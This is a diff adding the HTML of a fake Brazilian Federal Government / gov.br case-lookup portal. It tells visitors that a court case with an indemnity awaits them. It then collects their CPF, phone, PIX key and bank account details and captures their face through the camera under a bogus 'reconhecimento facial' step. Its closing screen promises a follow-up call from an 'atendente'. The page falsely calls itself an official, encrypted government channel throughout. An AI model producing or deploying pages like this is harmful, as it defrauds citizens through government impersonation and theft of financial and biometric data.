+    <nav class="gov-breadcrumb">
+        <div class="container mx-auto px-4">
+            <div class="flex items-center space-x-2 text-sm text-gov-blue-dark">
+                <a href="#" class="hover:underline">Início</a>
+                <i class="fas fa-chevron-right text-xs"></i>
+                <a href="#" class="hover:underline">Serviços</a>
+                <i class="fas fa-chevron-right text-xs"></i>
+                <span class="font-semibold">Consulta Processual</span>
+            </div>
+        </div>
+    </nav>
+
+    <main id="main-content">
+        <!-- PÁGINA INICIAL -->
+        <section id="page-initial" class="fade-in">
+            <div class="gradient-gov-light py-16">
+                <div class="container mx-auto px-4 text-center">
+                    <div class="slide-up">
+                        <h1 class="text-4xl md:text-5xl font-bold text-gov-blue mb-4">
+                            Consulta Processual
+                        </h1>
+                        <p class="text-xl text-gov-gray mb-8 max-w-3xl mx-auto">
+                            Consulte processos por CPF, CNPJ, nome ou número do processo de forma rápida e segura através do portal oficial do Governo Federal
+                        </p>
+                        <div class="max-w-2xl mx-auto">
+                            <div class="card-gov fade-in">
+                                <div class="flex flex-col md:flex-row gap-4">
+                                   
+                               <input id="cpf" type="text" placeholder="Digite um CPF (000.000.000-00)" class="input-gov flex-1" maxlength="14">
+                <button onclick="iniciarFluxo()" class="btn-gov whitespace-nowrap">
+                    <i class="fas fa-search mr-2"></i>
+                    Consultar CPF
+                </button> </div>
+                                <div class="mt-6 flex items-center justify-center space-x-6 text-sm text-gov-gray">
+                                    <div class="flex items-center">
+                                        <i class="fas fa-shield-alt text-gov-green mr-2"></i>
+                                        <span>100% Seguro</span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <i class="fas fa-clock text-gov-blue mr-2"></i>
+                                        <span>Consulta Instantânea</span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <i class="fas fa-eye-slash text-gov-gray mr-2"></i>
+                                        <span>Totalmente Sigiloso</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Seção de Funcionalidades -->
+            <section class="py-16 bg-white">
+                <div class="container mx-auto px-4">
+                    <h2 class="text-3xl font-bold text-center text-gov-blue mb-12">Como funciona nossa consulta?</h2>
+                    <div class="grid md:grid-cols-3 gap-8">
+                        <div class="card-gov text-center scale-in fade-in">
+                            <div class="w-16 h-16 bg-gov-blue-light rounded-full flex items-center justify-center mx-auto mb-6">
+                                <i class="fas fa-search text-2xl text-gov-blue"></i>
+                            </div>
+                            <h3 class="text-xl font-semibold text-gov-blue mb-4">Busca Otimizada</h3>
+                            <p class="text-gov-gray">Encontre processos pelo CPF, nome ou número utilizando nossa plataforma integrada aos principais tribunais do país.</p>
+                        </div>
+                        <div class="card-gov text-center scale-in fade-in" style="animation-delay: 0.2s;">
+                            <div class="w-16 h-16 bg-gov-blue-light rounded-full flex items-center justify-center mx-auto mb-6">
+                                <i class="fas fa-file-alt text-2xl text-gov-blue"></i>
+                            </div>
+                            <h3 class="text-xl font-semibold text-gov-blue mb-4">Informações Completas</h3>
+                            <p class="text-gov-gray">Acesse todas as movimentações, documentos e informações detalhadas do processo de forma organizada.</p>
+                        </div>
+                        <div class="card-gov text-center scale-in fade-in" style="animation-delay: 0.4s;">
+                            <div class="w-16 h-16 bg-gov-blue-light rounded-full flex items-center justify-center mx-auto mb-6">
+                                <i class="fas fa-bell text-2xl text-gov-blue"></i>
+                            </div>
+                            <h3 class="text-xl font-semibold text-gov-blue mb-4">Atualizações em Tempo Real</h3>
+                            <p class="text-gov-gray">Receba notificações automáticas sobre qualquer movimentação ou atualização em seus processos.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- FAQ -->
+            <section class="py-16 bg-gov-gray-light">
+                <div class="container mx-auto px-4">
+                    <h2 class="text-3xl font-bold text-center text-gov-blue mb-12">Perguntas Frequentes</h2>
+                    <div class="max-w-4xl mx-auto space-y-4">
+                        <details class="card-gov cursor-pointer fade-in">
+                            <summary class="font-semibold text-gov-blue flex items-center justify-between">
+                                Como consultar um processo?
+                                <i class="fas fa-chevron-down text-sm"></i>
+                            </summary>
+                            <p class="mt-4 text-gov-gray">Digite seu CPF, CNPJ, nome ou número do processo na barra de busca acima. Nossa plataforma irá buscar em todos os tribunais integrados.</p>
+                        </details>
+                        <details class="card-gov cursor-pointer fade-in">
+                            <summary class="font-semibold text-gov-blue flex items-center justify-between">
+                                Quais processos posso consultar?
+                                <i class="fas fa-chevron-down text-sm"></i>
+                            </summary>
+                            <p class="mt-4 text-gov-gray">Todos os processos públicos disponíveis nos tribunais integrados ao sistema, incluindo TRFs, TJs e tribunais superiores.</p>
+                        </details>
+                        <details class="card-gov cursor-pointer fade-in">
+                            <summary class="font-semibold text-gov-blue flex items-center justify-between">
+                                As partes ficam sabendo da pesquisa?
+                                <i class="fas fa-chevron-down text-sm"></i>
+                            </summary>
+                            <p class="mt-4 text-gov-gray">Não. A pesquisa é 100% sigilosa e segura. Nenhuma das partes envolvidas no processo será notificada sobre a consulta.</p>
+                        </details>
+                        <details class="card-gov cursor-pointer fade-in">
+                            <summary class="font-semibold text-gov-blue flex items-center justify-between">
+                                Em quais tribunais posso consultar?
+                                <i class="fas fa-chevron-down text-sm"></i>
+                            </summary>
+                            <p class="mt-4 text-gov-gray">Consultamos dados nos principais Tribunais Regionais Federais, Tribunais de Justiça estaduais e tribunais superiores do país.</p>
+                        </details>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Footer -->
+            <footer class="bg-gov-blue text-white py-12">
+                <div class="container mx-auto px-4">
+                    <div class="grid md:grid-cols-4 gap-8">
+                        <div>
+                            <h3 class="text-lg font-semibold mb-4">Para Cidadãos</h3>
+                            <ul class="space-y-2 text-sm opacity-90">
+                                <li><a href="#" class="hover:underline">Consulta Processual</a></li>
+                                <li><a href="#" class="hover:underline">Serviços Digitais</a></li>
+                                <li><a href="#" class="hover:underline">Atendimento</a></li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h3 class="text-lg font-semibold mb-4">Para Profissionais</h3>
+                            <ul class="space-y-2 text-sm opacity-90">
+                                <li><a href="#" class="hover:underline">Jurisprudência</a></li>
+                                <li><a href="#" class="hover:underline">Legislação</a></li>
+                                <li><a href="#" class="hover:underline">Modelos</a></li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h3 class="text-lg font-semibold mb-4">Institucional</h3>
+                            <ul class="space-y-2 text-sm opacity-90">
+                                <li><a href="#" class="hover:underline">Sobre o Portal</a></li>
+                                <li><a href="#" class="hover:underline">Transparência</a></li>
+                                <li><a href="#" class="hover:underline">Ouvidoria</a></li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h3 class="text-lg font-semibold mb-4">Ajuda</h3>
+                            <ul class="space-y-2 text-sm opacity-90">
+                                <li><a href="#" class="hover:underline">Central de Ajuda</a></li>
+                                <li><a href="#" class="hover:underline">Termos de Uso</a></li>
+                                <li><a href="#" class="hover:underline">Privacidade</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="border-t border-white border-opacity-20 mt-8 pt-8 text-center text-sm opacity-90">
+                        <p>© 2025 Governo Federal. Todos os direitos reservados.</p>
+                        <p class="mt-2">Portal desenvolvido seguindo o Padrão Digital de Governo</p>
+                    </div>
+                </div>
+            </footer>
+        </section>
+
+        <!-- PÁGINA DE RESULTADO DO PROCESSO -->
+        <section id="page-resultado" class="hidden min-h-screen bg-gov-gray-light py-8">
+            <div class="container mx-auto px-4 max-w-4xl">
+                <div class="card-gov fade-in">
+                    <div class="flex items-center mb-6">
+                        <div class="w-12 h-12 bg-gov-green rounded-full flex items-center justify-center mr-4">
+                            <i class="fas fa-check text-white text-xl"></i>
+                        </div>
+                        <div>
+                            <h2 class="text-2xl font-bold text-gov-blue">Processo Localizado</h2>
+                            <p class="text-gov-gray">Encontramos informações sobre o CPF consultado</p>
+                        </div>
+                    </div>
+
+                    <div class="grid md:grid-cols-2 gap-6 mb-6">
+                        <div class="space-y-4">
+                            <div>
+                                <label class="text-sm font-semibold text-gov-gray uppercase tracking-wide">Nome Completo</label>
+                                <p class="text-lg font-semibold text-gov-blue" id="nome"></p>
+                            </div>
+                            <div>
+                                <label class="text-sm font-semibold text-gov-gray uppercase tracking-wide">Data de Nascimento</label>
+                                <p class="text-lg font-semibold text-gov-blue" id="dataNascimento"></p>
+                            </div>
+                            <div>
+                                <label class="text-sm font-semibold text-gov-gray uppercase tracking-wide">Nome da Mãe</label>
+                                <p class="text-lg font-semibold text-gov-blue" id="nomeMae"></p>
+                            </div>
+                        </div>
+
+                        <div class="bg-gov-gold bg-opacity-10 border-l-4 border-gov-gold p-4 rounded-r-lg">
+                            <div class="flex items-start">
+                                <i class="fas fa-gavel text-gov-gold text-xl mr-3 mt-1"></i>
+                                <div>
+                                    <h3 class="font-semibold text-gov-blue mb-2">Processo Encontrado</h3>
+                                    <p class="text-sm font-semibold text-gov-gray mb-1">Número do Processo:</p>
+                                    <p class="font-mono text-gov-blue" id="numeroProcesso"></p>
+                                    <div class="mt-3" id="textoProcesso"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-gov-blue-lighter border border-gov-blue p-6 rounded-lg mb-6">
+                        <div class="flex items-center mb-4">
+                            <i class="fas fa-info-circle text-gov-blue text-xl mr-3"></i>
+                            <h3 class="text-lg font-semibold text-gov-blue">Informações Importantes</h3>
+                        </div>
+                        <ul class="space-y-2 text-gov-gray">
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                                <span>Processo com decisão favorável confirmada</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                                <span>Valor da indenização disponível para saque</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                                <span>Documentação validada pelos órgãos competentes</span>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <button onclick="goToBancario()" class="btn-gov w-full text-lg py-4">
+                        <i class="fas fa-university mr-2"></i>
+                        Preencher Dados para Recebimento
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- PÁGINA DE DADOS BANCÁRIOS E PIX -->
+        <section id="page-bancario" class="hidden min-h-screen bg-gov-gray-light py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="card-gov fade-in">
+                    <div class="text-center mb-8">
+                        <div class="w-16 h-16 bg-gov-blue-light rounded-full flex items-center justify-center mx-auto mb-4">
+                            <i class="fas fa-credit-card text-2xl text-gov-blue"></i>
+                        </div>
+                        <h2 class="text-2xl font-bold text-gov-blue mb-2">Dados para Recebimento</h2>
+                        <p class="text-gov-gray">Informe seus dados de contato e preferência de recebimento da indenização</p>
+                    </div>
+
+                    <div class="space-y-8">
+                        <!-- Dados de Contato -->
+                        <div class="bg-gov-blue-lighter border border-gov-blue p-6 rounded-lg">
+                            <h3 class="text-lg font-semibold text-gov-blue mb-4 flex items-center">
+                                <i class="fas fa-phone mr-2"></i>
+                                Dados de Contato
+                            </h3>
+                            <div>
+                                <label class="block text-sm font-semibold text-gov-gray mb-2">Telefone/WhatsApp</label>
+                                <input type="tel" placeholder="(11) 99999-9999" class="input-gov w-full" id="telefone" maxlength="15">
+                                <p class="text-xs text-gov-gray mt-1">Será usado para confirmação e atualizações sobre o processo</p>
+                            </div>
+                        </div>
+
+                        <!-- Dados PIX -->
+                        <div class="bg-green-50 border border-green-200 p-6 rounded-lg">
+                            <h3 class="text-lg font-semibold text-gov-blue mb-4 flex items-center">
+                                <i class="fas fa-qrcode mr-2"></i>
+                                Dados PIX (Recomendado)
+                            </h3>
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-sm font-semibold text-gov-gray mb-2">Tipo de Chave PIX</label>
+                                    <select class="select-gov w-full" id="tipoChavePix" onchange="updatePixPlaceholder()">
+                                        <option value="">Selecione o tipo de chave</option>
+                                        <option value="cpf">CPF</option>
+                                        <option value="email">E-mail</option>
+                                        <option value="telefone">Telefone</option>
+                                        <option value="aleatoria">Chave Aleatória</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-semibold text-gov-gray mb-2">Chave PIX</label>
+                                    <input type="text" placeholder="Digite sua chave PIX" class="input-gov w-full" id="chavePix">
+                                    <p class="text-xs text-gov-gray mt-1" id="pixHelper">Selecione o tipo de chave acima</p>
+                                </div>
+                            </div>
+                            <div class="mt-4 p-3 bg-green-100 rounded-lg">
+                                <div class="flex items-center text-sm text-green-800">
+                                    <i class="fas fa-bolt text-green-600 mr-2"></i>
+                                    <span><strong>PIX:</strong> Recebimento instantâneo, disponível 24h por dia</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Dados Bancários Tradicionais -->
+                        <div class="bg-gray-50 border border-gray-200 p-6 rounded-lg">
+                            <h3 class="text-lg font-semibold text-gov-blue mb-4 flex items-center">
+                                <i class="fas fa-university mr-2"></i>
+                                Dados Bancários Tradicionais (Opcional)
+                            </h3>
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-sm font-semibold text-gov-gray mb-2">Banco</label>
+                                    <input type="text" placeholder="Ex: Banco do Brasil, Caixa Econômica Federal, Itaú..." class="input-gov w-full" id="banco">
+                                </div>
+                                <div class="grid md:grid-cols-2 gap-4">
+                                    <div>
+                                        <label class="block text-sm font-semibold text-gov-gray mb-2">Agência</label>
+                                        <input type="text" placeholder="0000" class="input-gov w-full" id="agencia" maxlength="6">
+                                    </div>
+                                    <div>
+                                        <label class="block text-sm font-semibold text-gov-gray mb-2">Conta</label>
+                                        <input type="text" placeholder="00000-0" class="input-gov w-full" id="conta" maxlength="12">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="mt-4 p-3 bg-gray-100 rounded-lg">
+                                <div class="flex items-center text-sm text-gray-600">
+                                    <i class="fas fa-clock text-gray-500 mr-2"></i>
+                                    <span><strong>TED/DOC:</strong> Recebimento em 1-2 dias úteis</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-gov-blue-lighter border border-gov-blue p-4 rounded-lg mt-6">
+                        <div class="flex items-start">
+                            <i class="fas fa-shield-alt text-gov-blue text-lg mr-3 mt-1"></i>
+                            <div class="text-sm text-gov-gray">
+                                <p class="font-semibold text-gov-blue mb-1">Segurança dos Dados</p>
+                                <p>Seus dados são protegidos por criptografia de nível bancário e não são armazenados em nossos servidores após o processamento.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button onclick="goToGovLogin()" class="btn-gov w-full text-lg py-4 mt-8">
+                        <i class="fas fa-arrow-right mr-2"></i>
+                        Prosseguir com Verificação de Identidade
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- PÁGINA DE LOGIN GOV.BR -->
+        <section id="page-govbr-login" class="hidden min-h-screen bg-white py-8">
+            <div class="container mx-auto px-4 max-w-2xl">
+                <div class="card-gov fade-in">
+                    <div class="flex items-center mb-8">
+                        <svg class="w-12 h-12 mr-4" viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="200" height="60" fill="#005EA2"></rect>
+                            <text x="20" y="35" fill="white" font-size="24" font-weight="bold">gov.br</text>
+                        </svg>
+                        <div>
+                            <h2 class="text-xl font-bold text-gov-blue">Verificação de Identidade</h2>
+                            <p class="text-gov-gray">Identifique-se no gov.br para continuar</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-gov-gray border border-gray-300 rounded-lg p-4 mb-6">
+                        <label class="block text-sm font-semibold text-gov-gray mb-2">Número do CPF</label>
+                        <p class="text-gov-gray mb-2">Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+                        <input type="text" id="cpfGovbr" class="input-gov w-full font-mono text-lg" readonly="">
+                    </div>
+
+                    <button class="btn-gov w-full mb-8 bg-gov-blue hover:bg-gov-blue-dark">
+                        Continuar
+                    </button>
+
+                    <div class="border-t border-gray-200 pt-6">
+                        <h3 class="text-lg font-semibold text-gov-gray mb-4">Outras opções de identificação:</h3>
+                        <div class="space-y-3">
+                            <div class="flex items-center p-4 border border-gray-200 rounded-lg disabled-option">
+                                <i class="fas fa-university text-xl text-gov-gray mr-4"></i>
+                                <span class="text-gov-gray">Login com seu banco</span>
+                                <span class="ml-auto text-xs bg-gray-200 text-gray-600 px-2 py-1 rounded">Indisponível</span>
+                            </div>
+                            <div class="flex items-center p-4 border border-gray-200 rounded-lg disabled-option">
+                                <i class="fas fa-qrcode text-xl text-gov-gray mr-4"></i>
+                                <span class="text-gov-gray">Login com QR code</span>
+                                <span class="ml-auto text-xs bg-gray-200 text-gray-600 px-2 py-1 rounded">Indisponível</span>
+                            </div>
+                            <!-- OPÇÃO DE RECONHECIMENTO FACIAL (ATIVA) -->
+                            <button onclick="goToFacialScan()" class="w-full flex items-center p-4 border-2 border-gov-blue rounded-lg bg-gov-blue-lighter hover:bg-gov-blue-light transition-colors">
+                                <i class="fas fa-user-check text-xl text-gov-blue mr-4"></i>
+                                <div class="text-left flex-1">
+                                    <span class="font-semibold text-gov-blue block">Reconhecimento Facial</span>
+                                    <span class="text-sm text-gov-gray">Verificação biométrica segura</span>
+                                </div>
+                                <span class="text-xs bg-gov-green text-white px-2 py-1 rounded">Disponível</span>
+                            </button>
+                            <div class="flex items-center p-4 border border-gray-200 rounded-lg disabled-option">
+                                <i class="fas fa-certificate text-xl text-gov-gray mr-4"></i>
+                                <span class="text-gov-gray">Seu certificado digital</span>
+                                <span class="ml-auto text-xs bg-gray-200 text-gray-600 px-2 py-1 rounded">Indisponível</span>
+                            </div>
+                            <div class="flex items-center p-4 border border-gray-200 rounded-lg disabled-option">
+                                <i class="fas fa-cloud text-xl text-gov-gray mr-4"></i>
+                                <span class="text-gov-gray">Seu certificado digital em nuvem</span>
+                                <span class="ml-auto text-xs bg-gray-200 text-gray-600 px-2 py-1 rounded">Indisponível</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-8 text-center">
+                        <a href="#" class="text-gov-blue hover:underline text-sm">
+                            <i class="fas fa-question-circle mr-1"></i>
+                            Está com dúvidas e precisa de ajuda?
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PÁGINA DE ESCANEAMENTO FACIAL -->
+        <section id="page-facial-scan" class="hidden min-h-screen bg-gov-gray-light py-8">
+            <div class="container mx-auto px-4 max-w-2xl">
+                <div class="card-gov text-center fade-in">
+                    <div class="mb-6">
+                        <div class="w-16 h-16 bg-gov-blue-light rounded-full flex items-center justify-center mx-auto mb-4">
+                            <i class="fas fa-user-check text-2xl text-gov-blue"></i>
+                        </div>
+                        <h2 class="text-2xl font-bold text-gov-blue mb-2">Reconhecimento Facial</h2>
+                        <p class="text-gov-gray">Posicione seu rosto na área indicada para verificação</p>
+                    </div>
+
+                    <div class="relative w-full max-w-md mx-auto h-80 bg-gray-900 rounded-lg overflow-hidden mb-6">
+                        <video id="cameraFeed" class="w-full h-full object-cover transform scaleX(-1" autoplay="" playsinline=""></video>
+                        <div class="scan-line"></div>
+                        <div class="absolute inset-0 flex items-center justify-center">
+                            <div class="w-3/4 h-3/4 border-4 border-gov-blue rounded-full opacity-75 animate-pulse"></div>
+                        </div>
+                        <div class="absolute bottom-4 left-4 right-4">
+                            <div class="bg-black bg-opacity-50 text-white text-sm p-2 rounded">
+                                <i class="fas fa-info-circle mr-2"></i>
+                                Escaneamento em andamento...
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-3 text-sm text-gov-gray">
+                        <div class="flex items-center justify-center">
+                            <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                            <span>Mantenha seu rosto centralizado na tela</span>
+                        </div>
+                        <div class="flex items-center justify-center">
+                            <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                            <span>Certifique-se de que há boa iluminação</span>
+                        </div>
+                        <div class="flex items-center justify-center">
+                            <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                            <span>Remova óculos escuros ou acessórios</span>
+                        </div>
+                    </div>
+
+                    <div class="mt-6 p-4 bg-gov-blue-lighter border border-gov-blue rounded-lg">
+                        <div class="flex items-center text-sm text-gov-gray">
+                            <i class="fas fa-shield-alt text-gov-blue mr-2"></i>
+                            <span>Seus dados biométricos são processados localmente e não são armazenados</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PÁGINA DE USUÁRIO IDENTIFICADO -->
+        <section id="page-facial-identified" class="hidden min-h-screen bg-gov-gray-light py-8 flex items-center justify-center">
+            <div class="container mx-auto px-4 max-w-2xl">
+                <div class="card-gov text-center fade-in">
+                    <div class="w-20 h-20 bg-gov-green rounded-full flex items-center justify-center mx-auto mb-6">
+                        <i class="fas fa-check text-white text-3xl"></i>
+                    </div>
+                    <h2 class="text-3xl font-bold text-gov-blue mb-4">Usuário Identificado!</h2>
+                    <p class="text-lg text-gov-gray mb-8">Seu reconhecimento facial foi concluído com sucesso</p>
+
+                    <div class="bg-gov-green bg-opacity-10 border border-gov-green rounded-lg p-6 mb-6">
+                        <div class="flex items-center justify-center mb-4">
+                            <i class="fas fa-user-shield text-gov-green text-2xl mr-3"></i>
+                            <span class="font-semibold text-gov-green">Identidade Verificada</span>
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
+                            <div class="flex items-center justify-center">
+                                <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                                <span>Biometria Validada</span>
+                            </div>
+                            <div class="flex items-center justify-center">
+                                <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                                <span>CPF Confirmado</span>
+                            </div>
+                            <div class="flex items-center justify-center">
+                                <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                                <span>Acesso Autorizado</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="loading-spinner mx-auto mb-4"></div>
+                    <p class="text-gov-gray">Processando solicitação de saque...</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- PÁGINA DE SUCESSO JUSBRASIL -->
+        <section id="page-jusbrasil-success" class="hidden min-h-screen bg-gov-gray-light py-8 flex items-center justify-center">
+    <div class="container mx-auto px-4 max-w-2xl">
+        <div class="card-gov text-center fade-in">
+            <div class="mb-6">
+                <div class="w-20 h-20 bg-gov-green rounded-full flex items-center justify-center mx-auto mb-4">
+                    <i class="fas fa-check-double text-white text-3xl"></i>
+                </div>
+                <h2 class="text-3xl font-bold text-gov-blue mb-2">Solicitação Aprovada!</h2>
+                <p class="text-lg text-gov-gray">Sua solicitação de saque foi processada com sucesso.</p>
+            </div>
+
+            <div class="bg-gov-green bg-opacity-10 border border-gov-green rounded-lg p-6 mb-8">
+                <h3 class="font-semibold text-gov-green mb-4">Próximos Passos:</h3>
+                <div class="space-y-3 text-left">
+                    <div class="flex items-start">
+                        <div class="w-6 h-6 bg-gov-green rounded-full flex items-center justify-center mr-3 mt-0.5">
+                            <span class="text-white text-xs font-bold">1</span>
+                        </div>
+                        <div>
+                            <p class="font-semibold text-gov-blue">Aguardando Contato</p>
+                            <p class="text-sm text-gov-gray">
+                                Um de nossos atendentes entrará em contato com você, através do número informado, em alguns instantes.
+                            </p>
+                        </div>
+                    </div>
+                    <div class="flex items-start">
+                        <div class="w-6 h-6 bg-gov-green rounded-full flex items-center justify-center mr-3 mt-0.5">
+                            <span class="text-white text-xs font-bold">2</span>
+                        </div>
+                        <div>
+                            <p class="font-semibold text-gov-blue">Confirmação Final</p>
+                            <p class="text-sm text-gov-gray">Confirme seus dados de recebimento com o atendente especializado.</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start">
+                        <div class="w-6 h-6 bg-gov-green rounded-full flex items-center justify-center mr-3 mt-0.5">
+                            <span class="text-white text-xs font-bold">3</span>
+                        </div>
+                        <div>
+                            <p class="font-semibold text-gov-blue">Recebimento</p>
+                            <p class="text-sm text-gov-gray">O valor será transferido conforme o método escolhido.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mt-6 p-4 bg-gov-blue-lighter border border-gov-blue rounded-lg">
+                <div class="flex items-center text-sm text-gov-gray">
+                    <i class="fas fa-info-circle text-gov-blue mr-2"></i>
+                    <span>Este é um canal oficial do Governo Federal. Seus dados estão protegidos.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+    </main>
+
+    <!-- TELA DE LOADING -->
+    <div id="loading" class="hidden fixed inset-0 bg-white bg-opacity-95 backdrop-blur-sm flex flex-col items-center justify-center z-50">
+        <div class="card-gov text-center max-w-md">
+            <div class="loading-spinner mx-auto mb-6"></div>
+            <h3 class="text-xl font-semibold text-gov-blue mb-2">Processando...</h3>
+            <p class="text-gov-gray mb-4">Conectando com sistemas oficiais do governo</p>
+            <div class="flex items-center justify-center space-x-4 text-sm text-gov-gray">
+                <div class="flex items-center">
+                    <i class="fas fa-shield-alt text-gov-green mr-1"></i>
+                    <span>Seguro</span>
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-lock text-gov-blue mr-1"></i>
+                    <span>Criptografado</span>
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-certificate text-gov-gold mr-1"></i>
+                    <span>Oficial</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- WIDGET FLUTUANTE DE LIBRAS -->
+    <div class="libras-widget" onclick="toggleLibrasModal()">
+        <i class="fas fa-hands text-xl"></i>
+        <div class="libras-tooltip">Acessibilidade em Libras</div>
+    </div>
+
+    <!-- MODAL DE LIBRAS -->
+    <div id="libras-modal" class="libras-modal">
+        <div class="libras-modal-content">
+            <div class="flex items-center justify-between mb-6">
+                <div class="flex items-center">
+                    <div class="w-12 h-12 bg-gov-blue-light rounded-full flex items-center justify-center mr-4">
+                        <i class="fas fa-universal-access text-gov-blue text-xl"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-2xl font-bold text-gov-blue">Central de Acessibilidade</h3>
+                        <p class="text-gov-gray">Recursos para melhorar sua experiência</p>
+                    </div>
+                </div>
+                <button onclick="toggleLibrasModal()" class="text-gov-gray hover:text-gov-blue transition-colors p-2">
+                    <i class="fas fa-times text-xl"></i>
+                </button>
+            </div>
+
+            <!-- VLibras Container -->
+            <div class="vlibras-container">
+                <div class="vlibras-avatar">
+                    <i class="fas fa-hands"></i>
+                </div>
+                <h4 class="text-lg font-semibold text-gov-blue mb-2">Intérprete Virtual de Libras</h4>
+                <p class="text-gov-gray mb-4">Tradução automática para Língua Brasileira de Sinais</p>
+                <button onclick="toggleVLibras()" id="vlibras-btn" class="btn-gov">
+                    <i class="fas fa-play mr-2"></i>
+                    Ativar VLibras
+                </button>
+            </div>
+
+            <!-- Controles de Acessibilidade -->
+            <div class="accessibility-controls">
+                <div class="accessibility-control" onclick="toggleHighContrast()">
+                    <div class="control-icon">
+                        <i class="fas fa-adjust"></i>
+                    </div>
+                    <div class="control-title">Alto Contraste</div>
+                    <div class="control-description">Melhore a visibilidade com cores contrastantes</div>
+                </div>
+                <div class="accessibility-control" onclick="toggleLargeText()">
+                    <div class="control-icon">
+                        <i class="fas fa-text-height"></i>
+                    </div>
+                    <div class="control-title">Texto Grande</div>
+                    <div class="control-description">Aumente o tamanho da fonte para melhor leitura</div>
+                </div>
+                <div class="accessibility-control" onclick="toggleReducedMotion()">
+                    <div class="control-icon">
+                        <i class="fas fa-pause-circle"></i>
+                    </div>
+                    <div class="control-title">Reduzir Movimento</div>
+                    <div class="control-description">Diminui animações para usuários sensíveis</div>
+                </div>
+                <div class="accessibility-control">
+                    <div class="control-icon">
+                        <i class="fas fa-volume-up"></i>
+                    </div>
+                    <div class="control-title">Leitor de Tela</div>
+                    <div class="control-description">Compatível com NVDA, JAWS e outros</div>
+                    <input type="range" class="accessibility-slider" min="0" max="100" value="50" onchange="adjustVolume(this.value)">
+                </div>
+            </div>
+
+            <!-- Informações de Acessibilidade -->
+            <div class="mt-8 p-6 bg-gov-blue-lighter border border-gov-blue rounded-lg">
+                <h4 class="font-semibold text-gov-blue mb-3 flex items-center">
+                    <i class="fas fa-info-circle mr-2"></i>
+                    Sobre a Acessibilidade
+                </h4>
+                <div class="space-y-2 text-sm text-gov-gray">
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                        <span>Conforme WCAG 2.1 nível AA</span>
+                    </div>
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                        <span>Compatível com leitores de tela</span>
+                    </div>
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                        <span>Navegação por teclado</span>
+                    </div>
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle text-gov-green mr-2"></i>
+                        <span>Tradução automática para Libras</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Atalhos de Teclado -->
+            <div class="mt-6 p-4 bg-gov-gray-light rounded-lg">
+                <h5 class="font-semibold text-gov-blue mb-3">Atalhos de Teclado</h5>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm">
+                    <div class="flex justify-between">
+                        <span>Abrir acessibilidade:</span>
+                        <kbd class="bg-white px-2 py-1 rounded border">Alt + A</kbd>
+                    </div>
+                    <div class="flex justify-between">
+                        <span>Alto contraste:</span>
+                        <kbd class="bg-white px-2 py-1 rounded border">Alt + C</kbd>
+                    </div>
+                    <div class="flex justify-between">
+                        <span>Texto grande:</span>
+                        <kbd class="bg-white px-2 py-1 rounded border">Alt + T</kbd>
+                    </div>
+                    <div class="flex justify-between">
+                        <span>Ativar Libras:</span>
+                        <kbd class="bg-white px-2 py-1 rounded border">Alt + L</kbd>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Dados simulados
+        const pageIds = ["page-initial", "page-resultado", "page-bancario", "page-govbr-login", "page-facial-scan", "page-facial-identified", "page-jusbrasil-success"];
